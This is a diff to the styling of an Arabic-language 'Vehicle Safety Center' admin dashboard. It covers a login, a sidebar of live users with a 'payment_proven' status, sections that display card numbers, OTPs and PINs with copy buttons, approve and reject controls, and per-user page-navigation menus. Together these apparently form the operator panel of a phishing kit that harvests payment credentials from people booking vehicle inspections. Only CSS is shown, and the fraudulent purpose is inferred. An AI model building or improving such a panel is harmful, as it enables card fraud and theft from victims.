@@ -5,72 +5,406 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>مركز سلامة المركبات | لوحة التحكم</title>
 <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" rel="stylesheet"/>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Cairo',sans-serif;background:#f9fafb;direction:rtl;color:#111827;font-size:14px}
+body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#111827;font-size:14px}
 
 /* ===== LOGIN ===== */
-#loginPage{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#1a2744,#0f1f3d)}
-.lcard{background:#fff;border-radius:20px;padding:40px 36px;width:360px;box-shadow:0 20px 60px rgba(0,0,0,.35)}
-.lcard h2{text-align:center;font-size:20px;font-weight:800;margin-bottom:4px;color:#111827}
-.lcard p{text-align:center;font-size:12px;color:#6b7280;margin-bottom:28px}
-.lcard label{display:block;font-size:12px;font-weight:700;color:#374151;margin-bottom:6px}
-.lcard input{width:100%;padding:11px 14px;border:1.5px solid #e5e7eb;border-radius:10px;font-size:13px;font-family:inherit;outline:none;direction:ltr;margin-bottom:16px;transition:border-color .2s}
-.lcard input:focus{border-color:#2563eb}
+#loginPage{
+  height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  overflow:auto;
+  background:#fff;
+  font-family:'Cairo',sans-serif;
+}
+.sec-login-inner{
+  box-shadow:0px 0px 0px 0.5px rgba(50,50,93,.1),0px 2px 5px 0px rgba(50,50,93,.1),0px 1px 1.5px 0px rgba(0,0,0,.07);
+  border-radius:7px;
+  padding:30px 24px;
+  width:320px;
+  background:#fff;
+  text-align:center;
+}
+.sec-login-inner .div-logo img{
+  width:180px;
+  height:55px;
+  object-fit:contain;
+  margin-bottom:20px;
+}
+.sec-login-inner h5{
+  font-size:16px;
+  font-weight:700;
+  color:#233f48;
+  margin-bottom:6px;
+}
+.sec-login-inner p{
+  font-size:12px;
+  color:#6b7280;
+  margin-bottom:20px;
+}
+.sec-login-inner label{
+  display:block;
+  font-size:12px;
+  font-weight:700;
+  color:#374151;
+  margin-bottom:5px;
+  text-align:right;
+}
+.sec-login-inner input[type=password]{
+  width:100%;
+  padding:10px 13px;
+  border:1.5px solid #e5e7eb;
+  border-radius:8px;
+  font-size:13px;
+  font-family:inherit;
+  outline:none;
+  direction:ltr;
+  margin-bottom:14px;
+  transition:border-color .2s;
+}
+.sec-login-inner input[type=password]:focus{border-color:#04aa6d}
 .lerr{color:#ef4444;font-size:12px;text-align:center;margin-bottom:10px;display:none}
-.lbtn{width:100%;padding:13px;background:#2563eb;color:#fff;border:none;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;transition:background .2s}
-.lbtn:hover{background:#1d4ed8}
+.lbtn{
+  width:100%;
+  padding:11px;
+  background:#04aa6d;
+  color:#fff;
+  border:none;
+  border-radius:8px;
+  font-size:14px;
+  font-weight:700;
+  cursor:pointer;
+  font-family:inherit;
+  transition:background .2s;
+}
+.lbtn:hover{background:#0eb074}
 
-/* ===== ADMIN ===== */
-#adminPage{display:none;min-height:100vh;background:#f9fafb}
+/* ===== ADMIN PAGE ===== */
+#adminPage{display:none;min-height:100vh;background:#fff;font-family:'Cairo',sans-serif;}
 
 /* Navbar */
-.navbar{background:#fff;height:64px;padding:0 24px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f3f4f6;position:sticky;top:0;z-index:100}
-.nbrand{display:flex;align-items:center;gap:10px}
-.nbrand-icon{width:38px;height:38px;background:#2563eb;border-radius:10px;display:flex;align-items:center;justify-content:center}
-.nbrand-icon svg{width:20px;height:20px;color:#fff;fill:none;stroke:currentColor}
-.nbrand-name{font-size:15px;font-weight:800;color:#111827}
-.nbrand-sub{font-size:11px;color:#9ca3af;font-weight:400}
-.nright{display:flex;align-items:center;gap:10px}
-.vctr{display:flex;align-items:center;gap:5px;background:#f0fdf4;border:1.5px solid #bbf7d0;border-radius:20px;padding:5px 12px;font-size:12px;font-weight:700;color:#16a34a}
+.ad-navbar{
+  background:#233f48;
+  color:white;
+  padding:0 20px;
+  height:64px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  position:sticky;
+  top:0;
+  z-index:200;
+}
+.ad-navbar .logo-img{
+  width:140px;
+  height:40px;
+  object-fit:contain;
+}
+.ad-navbar .nav-title{
+  font-size:15px;
+  font-weight:700;
+  color:#fff;
+}
+.ad-navbar .nav-right{
+  display:flex;
+  align-items:center;
+  gap:10px;
+}
+.vctr{
+  display:flex;
+  align-items:center;
+  gap:5px;
+  background:rgba(255,255,255,.15);
+  border-radius:20px;
+  padding:5px 12px;
+  font-size:12px;
+  font-weight:700;
+  color:#fff;
+}
 .vdot{width:7px;height:7px;border-radius:50%;background:#22c55e;animation:pulse 2s infinite}
-.cbadge{display:flex;align-items:center;gap:5px;font-size:12px;font-weight:600;padding:5px 10px;border-radius:20px;background:#f3f4f6;color:#6b7280}
+.cbadge{
+  display:flex;
+  align-items:center;
+  gap:5px;
+  font-size:12px;
+  font-weight:600;
+  padding:5px 10px;
+  border-radius:20px;
+  background:rgba(255,255,255,.1);
+  color:#fff;
+}
 .cdot{width:7px;height:7px;border-radius:50%;background:#9ca3af}
 .cdot.on{background:#22c55e;animation:pulse 2s infinite}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
-.lout{padding:7px 14px;background:#fee2e2;color:#ef4444;border:none;border-radius:9px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;transition:background .2s}
-.lout:hover{background:#fecaca}
+.lout{
+  padding:7px 14px;
+  background:rgba(255,255,255,.15);
+  color:#fff;
+  border:1px solid rgba(255,255,255,.3);
+  border-radius:8px;
+  font-size:12px;
+  font-weight:700;
+  cursor:pointer;
+  font-family:inherit;
+  transition:background .2s;
+}
+.lout:hover{background:rgba(255,255,255,.25)}
 
-/* Stats */
-.stats{display:grid;grid-template-columns:repeat(5,1fr);gap:14px;padding:20px 24px 0}
-.sc{background:#fff;border-radius:14px;padding:16px;display:flex;align-items:center;gap:12px;border:1px solid #f3f4f6;box-shadow:0 1px 3px rgba(0,0,0,.04)}
-.si{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.si svg{width:22px;height:22px;fill:none;stroke:currentColor}
-.si-b{background:#dbeafe;color:#2563eb}.si-g{background:#dcfce7;color:#16a34a}.si-o{background:#ffedd5;color:#ea580c}.si-p{background:#ede9fe;color:#7c3aed}.si-t{background:#ccfbf1;color:#0d9488}
-.sn{font-size:22px;font-weight:900;color:#111827;line-height:1}
-.sl{font-size:11px;color:#6b7280;margin-top:3px;font-weight:600}
+/* Stats bar */
+.stats-bar{
+  background:#fff;
+  padding:12px 20px;
+  display:flex;
+  gap:12px;
+  border-bottom:1px solid #e8e8e7;
+  flex-wrap:wrap;
+}
+.sc{
+  background:#f1f4f8;
+  border-radius:10px;
+  padding:10px 16px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  flex:1;
+  min-width:130px;
+}
+.si{
+  width:36px;
+  height:36px;
+  border-radius:9px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-shrink:0;
+}
+.si svg{width:18px;height:18px;fill:none;stroke:currentColor}
+.si-b{background:#dbeafe;color:#2563eb}
+.si-g{background:#dcfce7;color:#16a34a}
+.si-o{background:#ffedd5;color:#ea580c}
+.si-p{background:#ede9fe;color:#7c3aed}
+.si-t{background:#ccfbf1;color:#0d9488}
+.sn{font-size:20px;font-weight:900;color:#233f48;line-height:1}
+.sl{font-size:11px;color:#6b7280;margin-top:2px;font-weight:600}
 
-/* Main */
-.main{padding:20px 24px}
-.tcard{background:#fff;border-radius:16px;border:1px solid #f3f4f6;overflow:hidden}
-.ttbar{padding:14px 18px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f3f4f6}
-.ttitle{font-size:14px;font-weight:800;display:flex;align-items:center;gap:7px;color:#111827}
-.ttitle svg{fill:none;stroke:currentColor}
-.tright{display:flex;gap:8px;align-items:center}
-.srch{display:flex;align-items:center;gap:7px;background:#f9fafb;border:1.5px solid #e5e7eb;border-radius:9px;padding:7px 12px;width:200px}
-.srch svg{width:14px;height:14px;color:#9ca3af;flex-shrink:0;fill:none;stroke:currentColor}
-.srch input{border:none;background:transparent;font-size:12px;outline:none;width:100%;font-family:inherit}
-.rbtn{display:flex;align-items:center;gap:5px;padding:7px 13px;background:#f9fafb;border:1.5px solid #e5e7eb;border-radius:9px;font-size:12px;font-weight:600;cursor:pointer;color:#6b7280;font-family:inherit;transition:background .2s}
-.rbtn:hover{background:#f3f4f6}
-.rbtn svg{fill:none;stroke:currentColor}
+/* Main layout: sidebar + content */
+.sec-admin-tmp{
+  position:relative;
+  background:#fff;
+  font-family:'Cairo',sans-serif;
+  font-size:14px;
+}
+.sec-admin-tmp .sidebar-container{
+  min-height:calc(100vh - 120px);
+  display:flex;
+}
+.sec-admin-tmp .sidebar-container .sidebar{
+  margin:0;
+  padding:10px;
+  width:220px;
+  min-width:220px;
+  background-color:#f1f1f1;
+  position:sticky;
+  top:64px;
+  height:calc(100vh - 64px);
+  overflow-y:auto;
+  border-left:1px solid #e8e8e7;
+}
+.sidebar-header{
+  padding:8px 6px;
+  font-size:12px;
+  font-weight:700;
+  color:#6b7280;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  margin-bottom:4px;
+}
+.sidebar-search{
+  display:flex;
+  align-items:center;
+  gap:6px;
+  background:#fff;
+  border:1px solid #e6e6e6;
+  border-radius:7px;
+  padding:6px 10px;
+  margin-bottom:8px;
+}
+.sidebar-search svg{width:13px;height:13px;fill:none;stroke:#9ca3af;flex-shrink:0}
+.sidebar-search input{
+  border:none;
+  background:transparent;
+  font-size:12px;
+  outline:none;
+  width:100%;
+  font-family:inherit;
+}
+.sec-admin-tmp .sidebar-container .sidebar .user-div{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:8px 10px;
+  border-radius:7px;
+  cursor:pointer;
+  margin-bottom:3px;
+  transition:background .15s ease,box-shadow .15s ease,color .15s ease;
+  border:1px solid #e6e6e6;
+  box-shadow:0px 0px 1px rgba(0,0,0,.03),0px 1px 1px rgba(0,0,0,.02);
+  background:#fff;
+}
+.sec-admin-tmp .sidebar-container .sidebar .user-div .info-user{
+  display:flex;
+  align-items:center;
+  justify-content:flex-start;
+  gap:5px;
+  flex:1;
+  min-width:0;
+}
+.sec-admin-tmp .sidebar-container .sidebar .user-div .info-user .new-action{
+  display:inline-block;
+  min-width:8px;
+  min-height:8px;
+  background-color:green;
+  border-radius:10px;
+  flex-shrink:0;
+}
+.sec-admin-tmp .sidebar-container .sidebar .user-div .info-user .name{
+  width:120px;
+  overflow:hidden;
+  text-overflow:ellipsis;
+  white-space:nowrap;
+  font-size:12px;
+  font-weight:600;
+  color:#233f48;
+}
+.sec-admin-tmp .sidebar-container .sidebar .user-div .status-user{
+  color:#404040;
+  font-size:11px;
+  flex-shrink:0;
+}
+.sec-admin-tmp .sidebar-container .sidebar .user-div .status-user .payment_proven{
+  color:blue;
+}
+.sec-admin-tmp .sidebar-container .sidebar .user-div.selected{
+  background-color:#04aa6d;
+  color:white;
+  border-color:#04aa6d;
+}
+.sec-admin-tmp .sidebar-container .sidebar .user-div.selected .info-user .name{
+  color:#fff;
+}
+.sec-admin-tmp .sidebar-container .sidebar .user-div:hover:not(.selected){
+  background-color:#0eb074;
+  color:white;
+  border-color:#0eb074;
+}
+.sec-admin-tmp .sidebar-container .sidebar .user-div:hover:not(.selected) .info-user .name{
+  color:#fff;
+}
 
-/* Table */
-table{width:100%;border-collapse:collapse}
-thead th{background:#f9fafb;padding:10px 14px;font-size:11px;font-weight:700;color:#6b7280;text-align:right;border-bottom:1px solid #f3f4f6}
-tbody td{padding:11px 14px;font-size:12px;color:#374151;border-bottom:1px solid #f9fafb}
-tbody tr:last-child td{border-bottom:none}
-tbody tr:hover td{background:#fafafa}
+/* Content area */
+.sec-admin-tmp .sidebar-container div.content{
+  flex:1;
+  min-height:100%;
+  padding:16px;
+  overflow-y:auto;
+}
+
+/* Content top bar */
+.content-topbar{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  margin-bottom:14px;
+}
+.content-title{
+  font-size:15px;
+  font-weight:800;
+  color:#233f48;
+  display:flex;
+  align-items:center;
+  gap:7px;
+}
+.content-title svg{fill:none;stroke:currentColor;width:18px;height:18px}
+.content-actions{display:flex;gap:8px;align-items:center}
+.rbtn{
+  display:flex;
+  align-items:center;
+  gap:5px;
+  padding:7px 13px;
+  background:#f1f1f1;
+  border:1.5px solid #e6e6e6;
+  border-radius:8px;
+  font-size:12px;
+  font-weight:600;
+  cursor:pointer;
+  color:#6b7280;
+  font-family:inherit;
+  transition:background .2s;
+}
+.rbtn:hover{background:#e8e8e7}
+.rbtn svg{fill:none;stroke:currentColor;width:13px;height:13px}
+
+/* Cards grid */
+.cards-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(280px,1fr));
+  gap:12px;
+}
+
+/* Booking card */
+.bk-card{
+  background:#fff;
+  border-radius:12px;
+  border:1px solid #e6e6e6;
+  box-shadow:0px 1px 3px rgba(0,0,0,.04);
+  overflow:hidden;
+  cursor:pointer;
+  transition:box-shadow .2s,border-color .2s;
+}
+.bk-card:hover{
+  box-shadow:0px 4px 12px rgba(0,0,0,.1);
+  border-color:#04aa6d;
+}
+.bk-card-header{
+  background:#f1f4f8;
+  padding:10px 14px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  border-bottom:1px solid #e6e6e6;
+}
+.bk-card-name{
+  font-size:13px;
+  font-weight:700;
+  color:#233f48;
+}
+.bk-card-body{
+  padding:10px 14px;
+}
+.bk-field{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:4px 0;
+  border-bottom:1px solid #f1f1f1;
+  font-size:12px;
+}
+.bk-field:last-child{border-bottom:none}
+.bk-lbl{color:#6b7280;font-weight:500}
+.bk-val{font-weight:600;color:#233f48}
+.bk-card-footer{
+  padding:8px 14px;
+  border-top:1px solid #f1f1f1;
+  display:flex;
+  gap:6px;
+  flex-wrap:wrap;
+}
 
 /* Badges */
 .badge{display:inline-flex;align-items:center;gap:3px;padding:2px 10px;border-radius:20px;font-size:10px;font-weight:700}
@@ -83,207 +417,513 @@ tbody tr:hover td{background:#fafafa}
 .b-pin{background:#ccfbf1;color:#0d9488}
 
 @keyframes rowFlash{0%{background:transparent}30%{background:#fef9c3}60%{background:#dcfce7}100%{background:transparent}}
-.rflash td{animation:rowFlash 1.5s ease}
+.rflash{animation:rowFlash 1.5s ease}
 
-/* Action buttons in table */
-.bdet{padding:5px 11px;background:#2563eb;color:#fff;border:none;border-radius:7px;font-size:11px;font-weight:700;cursor:pointer;font-family:inherit;display:inline-flex;align-items:center;gap:4px;transition:background .2s}
-.bdet:hover{background:#1d4ed8}
-.bdet svg{fill:none;stroke:currentColor}
+/* Action buttons */
+.bdet{
+  padding:5px 11px;
+  background:#04aa6d;
+  color:#fff;
+  border:none;
+  border-radius:7px;
+  font-size:11px;
+  font-weight:700;
+  cursor:pointer;
+  font-family:inherit;
+  display:inline-flex;
+  align-items:center;
+  gap:4px;
+  transition:background .2s;
+}
+.bdet:hover{background:#0eb074}
+.bdet svg{fill:none;stroke:currentColor;width:12px;height:12px}
+
+/* Nav buttons */
 .bnav-wrap{position:relative;display:inline-block}
-.bnav{padding:5px 9px;background:#f3f4f6;color:#6b7280;border:1.5px solid #e5e7eb;border-radius:7px;font-size:11px;cursor:pointer;font-family:inherit;display:inline-flex;align-items:center;gap:3px;transition:background .2s}
-.bnav:hover{background:#e5e7eb}
-.bnav svg{fill:none;stroke:currentColor}
-.ndrop{display:none;position:absolute;top:calc(100% + 4px);left:0;background:#fff;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.12);z-index:300;min-width:185px;padding:5px;border:1px solid #f3f4f6}
+.bnav{
+  padding:5px 9px;
+  background:#f1f1f1;
+  color:#6b7280;
+  border:1.5px solid #e6e6e6;
+  border-radius:7px;
+  font-size:11px;
+  cursor:pointer;
+  font-family:inherit;
+  display:inline-flex;
+  align-items:center;
+  gap:3px;
+  transition:background .2s;
+}
+.bnav:hover{background:#e8e8e7}
+.bnav svg{fill:none;stroke:currentColor;width:12px;height:12px}
+.ndrop{
+  display:none;
+  position:absolute;
+  top:calc(100% + 4px);
+  left:0;
+  background:#fff;
+  border-radius:12px;
+  box-shadow:0 10px 30px rgba(0,0,0,.12);
+  z-index:300;
+  min-width:185px;
+  padding:5px;
+  border:1px solid #e6e6e6;
+}
 .ndrop.open{display:block}
-.nitem{display:flex;align-items:center;gap:8px;padding:8px 10px;border-radius:8px;font-size:12px;color:#374151;cursor:pointer;transition:background .15s;font-weight:600}
-.nitem:hover{background:#f9fafb}
-.nitem-ic{width:26px;height:26px;border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.nitem{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  padding:8px 10px;
+  border-radius:8px;
+  font-size:12px;
+  color:#374151;
+  cursor:pointer;
+  transition:background .15s;
+  font-weight:600;
+}
+.nitem:hover{background:#f1f1f1}
+.nitem-ic{
+  width:26px;
+  height:26px;
+  border-radius:6px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-shrink:0;
+}
 .nitem-ic svg{width:13px;height:13px;fill:none;stroke:currentColor}
 
-.empty{text-align:center;padding:48px 20px;color:#9ca3af}
-.empty svg{width:40px;height:40px;margin:0 auto 10px;display:block;opacity:.3;fill:none;stroke:currentColor}
-.empty p{font-size:13px;font-weight:600}
+.empty-state{
+  text-align:center;
+  padding:60px 20px;
+  color:#9ca3af;
+}
+.empty-state svg{
+  width:50px;
+  height:50px;
+  margin:0 auto 12px;
+  display:block;
+  opacity:.3;
+  fill:none;
+  stroke:currentColor;
+}
+.empty-state p{font-size:13px;font-weight:600}
 
 /* ===== MODAL ===== */
-.moverlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:1000;align-items:flex-start;justify-content:center;padding:20px;overflow-y:auto}
+.moverlay{
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.6);
+  z-index:1000;
+  align-items:flex-start;
+  justify-content:center;
+  padding:20px;
+  overflow-y:auto;
+}
 .moverlay.open{display:flex}
-.modal{background:#fff;border-radius:20px;width:100%;max-width:500px;max-height:90vh;overflow-y:auto;box-shadow:0 25px 60px rgba(0,0,0,.25);direction:rtl;margin:auto}
-
-/* Modal header */
-.mhdr{padding:16px 20px;border-bottom:1px solid #f3f4f6;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;background:#fff;z-index:10;border-radius:20px 20px 0 0}
-.mhdr-t{font-size:15px;font-weight:800;color:#111827}
-.mhdr-s{font-size:11px;color:#2563eb;font-family:monospace;direction:ltr;font-weight:600}
-.mclose{width:30px;height:30px;border-radius:8px;background:#f3f4f6;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#6b7280;transition:all .2s}
-.mclose:hover{background:#fee2e2;color:#ef4444}
+.modal{
+  background:#fff;
+  border-radius:16px;
+  width:100%;
+  max-width:520px;
+  max-height:90vh;
+  overflow-y:auto;
+  box-shadow:0 25px 60px rgba(0,0,0,.25);
+  direction:rtl;
+  margin:auto;
+}
+.mhdr{
+  padding:16px 20px;
+  border-bottom:1px solid #e6e6e6;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  position:sticky;
+  top:0;
+  background:#233f48;
+  z-index:10;
+  border-radius:16px 16px 0 0;
+}
+.mhdr-t{font-size:15px;font-weight:800;color:#fff}
+.mhdr-s{font-size:11px;color:rgba(255,255,255,.7);font-family:monospace;direction:ltr;font-weight:600}
+.mclose{
+  width:30px;
+  height:30px;
+  border-radius:8px;
+  background:rgba(255,255,255,.15);
+  border:none;
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#fff;
+  transition:all .2s;
+}
+.mclose:hover{background:rgba(255,255,255,.3)}
 .mclose svg{width:14px;height:14px;fill:none;stroke:currentColor}
-
-/* Modal body */
 .mbody{padding:16px 20px 20px}
 
 /* Section header */
-.msec-hdr{font-size:13px;font-weight:700;color:#374151;margin-bottom:10px;display:flex;align-items:center;gap:6px}
+.msec-hdr{
+  font-size:13px;
+  font-weight:700;
+  color:#374151;
+  margin-bottom:10px;
+  display:flex;
+  align-items:center;
+  gap:6px;
+}
 .msec-hdr svg{fill:none;stroke:currentColor}
 
-/* Field list - veachelimf style */
-.flist{background:#f9fafb;border-radius:14px;padding:0 14px;margin-bottom:16px;overflow:hidden}
-.frow{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f3f4f6}
+/* Field list */
+.flist{
+  background:#f9fafb;
+  border-radius:12px;
+  padding:0 14px;
+  margin-bottom:16px;
+  overflow:hidden;
+  border:1px solid #e6e6e6;
+}
+.frow{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:9px 0;
+  border-bottom:1px solid #f1f1f1;
+}
 .frow:last-child{border-bottom:none}
-.flbl{font-size:13px;color:#6b7280;font-weight:500}
-.fval{font-size:13px;font-weight:600;color:#1f2937;direction:ltr;text-align:left;display:flex;align-items:center;gap:6px}
+.flbl{font-size:12px;color:#6b7280;font-weight:500}
+.fval{font-size:12px;font-weight:600;color:#1f2937;direction:ltr;text-align:left;display:flex;align-items:center;gap:6px}
 .fval.ar{direction:rtl;text-align:right}
 
 /* Card section */
 .card-sec{margin-bottom:16px}
-.card-list{background:#f9fafb;border-radius:14px;padding:0 14px;overflow:hidden}
-.card-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f3f4f6}
+.card-list{
+  background:#f9fafb;
+  border-radius:12px;
+  padding:0 14px;
+  overflow:hidden;
+  border:1px solid #e6e6e6;
+}
+.card-row{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:9px 0;
+  border-bottom:1px solid #f1f1f1;
+}
 .card-row:last-child{border-bottom:none}
-.card-lbl{font-size:13px;color:#6b7280;font-weight:500}
-.card-val{font-size:13px;font-weight:600;color:#1f2937;direction:ltr;text-align:left;display:flex;align-items:center;gap:6px}
+.card-lbl{font-size:12px;color:#6b7280;font-weight:500}
+.card-val{font-size:12px;font-weight:600;color:#1f2937;direction:ltr;text-align:left;display:flex;align-items:center;gap:6px}
 .card-num{font-family:'Courier New',monospace;letter-spacing:1px;font-size:13px;font-weight:700}
 
 /* Copy button */
-.cpbtn{background:none;border:none;cursor:pointer;color:#9ca3af;padding:3px;border-radius:5px;display:flex;align-items:center;transition:color .2s}
-.cpbtn:hover{color:#2563eb}
-.cpbtn svg{width:14px;height:14px;fill:none;stroke:currentColor}
+.cpbtn{
+  background:none;
+  border:none;
+  cursor:pointer;
+  color:#9ca3af;
+  padding:3px;
+  border-radius:5px;
+  display:flex;
+  align-items:center;
+  transition:color .2s;
+}
+.cpbtn:hover{color:#04aa6d}
+.cpbtn svg{width:13px;height:13px;fill:none;stroke:currentColor}
 
 /* OTP section */
-.otp-sec{background:#f9fafb;border-radius:14px;padding:0 14px;margin-bottom:16px}
-.otp-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f3f4f6}
+.otp-sec{
+  background:#f9fafb;
+  border-radius:12px;
+  padding:0 14px;
+  margin-bottom:16px;
+  border:1px solid #e6e6e6;
+}
+.otp-row{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:9px 0;
+  border-bottom:1px solid #f1f1f1;
+}
 .otp-row:last-child{border-bottom:none}
-.otp-lbl{font-size:13px;color:#6b7280;font-weight:500}
+.otp-lbl{font-size:12px;color:#6b7280;font-weight:500}
 .otp-val{font-size:18px;font-weight:900;font-family:'Courier New',monospace;letter-spacing:4px;color:#d97706;display:flex;align-items:center;gap:6px}
 .pin-val{font-size:18px;font-weight:900;font-family:'Courier New',monospace;letter-spacing:4px;color:#0d9488;display:flex;align-items:center;gap:6px}
 .otp-wait{font-size:12px;color:#9ca3af;font-style:italic}
 
-/* Actions section */
+/* Waiting */
+.waiting{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  padding:12px 14px;
+  font-size:12px;
+  color:#9ca3af;
+  background:#f9fafb;
+  border-radius:12px;
+  margin-bottom:16px;
+  border:1px solid #e6e6e6;
+}
+.spin svg{
+  width:16px;
+  height:16px;
+  fill:none;
+  stroke:#9ca3af;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* Actions */
 .act-sec{margin-bottom:16px}
 .act-btns{display:flex;gap:8px}
-.abtn{flex:1;padding:10px;border:none;border-radius:10px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:5px;transition:all .2s}
+.abtn{
+  flex:1;
+  padding:10px;
+  border:none;
+  border-radius:10px;
+  font-size:13px;
+  font-weight:700;
+  cursor:pointer;
+  font-family:inherit;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:5px;
+  transition:all .2s;
+}
 .abtn svg{width:14px;height:14px;fill:none;stroke:currentColor}
 .abtn-gray{background:#f3f4f6;color:#9ca3af;pointer-events:none}
-.abtn-ok{background:#16a34a;color:#fff}.abtn-ok:hover{background:#15803d}
-.abtn-rj{background:#ef4444;color:#fff}.abtn-rj:hover{background:#dc2626}
-.abtn-done{background:#6b7280;color:#fff}.abtn-done:hover{background:#4b5563}
+.abtn-ok{background:#04aa6d;color:#fff}
+.abtn-ok:hover{background:#0eb074}
+.abtn-rj{background:#fee2e2;color:#ef4444}
+.abtn-rj:hover{background:#fecaca}
+.abtn-done{background:#dbeafe;color:#2563eb}
+.abtn-done:hover{background:#bfdbfe}
+.rej-msg{margin-top:10px}
+.rej-msg label{font-size:12px;font-weight:600;color:#6b7280;margin-bottom:5px;display:block}
+.rej-msg input{
+  width:100%;
+  padding:8px 12px;
+  border:1.5px solid #e6e6e6;
+  border-radius:8px;
+  font-size:12px;
+  font-family:inherit;
+  outline:none;
+}
+.rej-msg input:focus{border-color:#04aa6d}
 
-/* Reject message */
-.rej-msg{margin-bottom:16px}
-.rej-msg label{font-size:12px;font-weight:600;color:#6b7280;display:block;margin-bottom:5px}
-.rej-msg input{width:100%;padding:9px 12px;border:1.5px solid #e5e7eb;border-radius:9px;font-size:12px;font-family:inherit;outline:none;transition:border-color .2s}
-.rej-msg input:focus{border-color:#2563eb}
-
-/* Nav buttons */
-.nav-sec{margin-bottom:16px}
-.nav-btns{display:flex;flex-wrap:wrap;gap:6px}
-.nbp{padding:7px 13px;border:none;border-radius:9px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;transition:opacity .2s}
+/* Nav buttons in modal */
+.nav-btns{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px}
+.nbp{
+  padding:7px 12px;
+  border:none;
+  border-radius:8px;
+  font-size:12px;
+  font-weight:700;
+  cursor:pointer;
+  font-family:inherit;
+  transition:opacity .2s;
+}
 .nbp:hover{opacity:.8}
 
 /* Footer dates */
-.mfooter{padding-top:12px;border-top:1px solid #f3f4f6}
-.mfdate{display:flex;justify-content:space-between;align-items:center;padding:4px 0}
-.mfdate-l{font-size:12px;color:#9ca3af;font-weight:500}
-.mfdate-v{font-size:12px;color:#6b7280;font-weight:600;direction:ltr}
-
-/* Waiting spinner */
-.waiting{display:flex;align-items:center;justify-content:center;gap:8px;padding:20px;color:#9ca3af;font-size:12px;font-weight:600}
-@keyframes spin{to{transform:rotate(360deg)}}
-.spin{animation:spin 1s linear infinite;display:inline-block}
-.spin svg{width:14px;height:14px;fill:none;stroke:currentColor}
+.mfooter{
+  background:#f9fafb;
+  border-radius:12px;
+  padding:0 14px;
+  border:1px solid #e6e6e6;
+}
+.mfdate{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:8px 0;
+  border-bottom:1px solid #f1f1f1;
+  font-size:11px;
+}
+.mfdate:last-child{border-bottom:none}
+.mfdate-l{color:#6b7280;font-weight:500}
+.mfdate-v{color:#374151;font-weight:600;direction:ltr}
 
 /* Toast */
-.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#111827;color:#fff;padding:10px 20px;border-radius:12px;font-size:12px;font-weight:600;z-index:9999;display:none;box-shadow:0 8px 24px rgba(0,0,0,.2);white-space:nowrap}
-.toast.show{display:block;animation:fadeUp .3s ease}
-@keyframes fadeUp{from{opacity:0;transform:translateX(-50%) translateY(8px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}
+#toast{
+  position:fixed;
+  bottom:24px;
+  left:50%;
+  transform:translateX(-50%) translateY(20px);
+  background:#233f48;
+  color:#fff;
+  padding:10px 20px;
+  border-radius:10px;
+  font-size:13px;
+  font-weight:600;
+  opacity:0;
+  transition:all .3s;
+  z-index:9999;
+  pointer-events:none;
+  white-space:nowrap;
+}
+#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
 
-@keyframes boxPulse{0%{box-shadow:0 0 0 0 rgba(37,99,235,.4)}70%{box-shadow:0 0 0 8px rgba(37,99,235,0)}100%{box-shadow:0 0 0 0 rgba(37,99,235,0)}}
